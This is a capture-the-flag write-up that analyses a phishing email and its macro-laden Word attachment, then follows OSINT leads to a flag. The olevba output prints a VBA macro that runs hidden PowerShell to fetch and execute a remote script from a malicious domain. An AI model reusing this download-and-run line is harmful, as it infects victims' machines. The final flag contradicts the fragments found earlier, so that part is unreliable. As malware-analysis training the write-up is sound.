### InfraBroken :

# Description :

>An attacker sends a phishing email disguised as a legitimate notification about a package arrival. The email instructs the recipient to click on a link to view an invoice and product details, which is actually a malicious attempt to steal sensitive information or install malware on the victim's machine !!!

> Author : Mr_Togoo

> Attachments : [crime.eml](https://www.mediafire.com/file/lcso0oy3pjqo3kd/crime.eml/file)

During the analysis of the email, we identified the user who sent the email and the link to the document.



    1- user : aymanetogoo@gmail.com
    2- document : Product_details.docm


![email](https://github.com/user-attachments/assets/3a918e61-9b5d-414c-b2a2-f81da4c3b1f3)



    We installed the document Product_details.docm and analyzed it with 'olevba'.



![Product](https://github.com/user-attachments/assets/6c5fb5f5-58b9-4762-a2dd-c2b06f3b5fd5)


We obtained this output:

`Set objShell = CreateObject("WScript.Shell")
`objShell.Run "cmd.exe /c powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command iex (New-Object Net.WebClient).DownloadString('http://bericht-belastingdienst.com/good_news.vbs')", 0, False`

1. When checking the reputation of the domain bericht-belastingdienst.com, we found it to be very malicious.

![virustotal](https://github.com/user-attachments/assets/0df2e53a-ba87-4b64-8d26-3bd5420be93b)
And here, we obtained the first part of the flag.

`CSP{5om3tim35_th3_thing5`


2. Now, we need to check the user who sent the email and perform some OSINT to see if they have other social media accounts.
   
   

![github](https://github.com/user-attachments/assets/12a503ff-2b4b-488f-ba71-851f9a74c61f)
3. So, he has a GitHub account and a repository named `Important`
   

![github2](https://github.com/user-attachments/assets/0e78a70a-74b0-4e17-9448-0ee7c53229e3)

![github3](https://github.com/user-attachments/assets/22ec982a-98ca-4f6c-a1bf-18b5e838de6a)
4.  When you enter GitHub, you don't find the flag immediately. You need to check the history of the comments to find it.

   `_4r3_34Sy_but_l4h_yhdin4}`

5. So, the full flag is

FLAG : 
>CSP{DN5_G00D_T0_3XF1L7R3_V1A_53CUR3_CH4NN3L5_4ND_L4H_YT9ABL_SY4MNA}

**Note** : These pieces of information were not found because I removed my comment in VirusTotal and the user on GitHub.
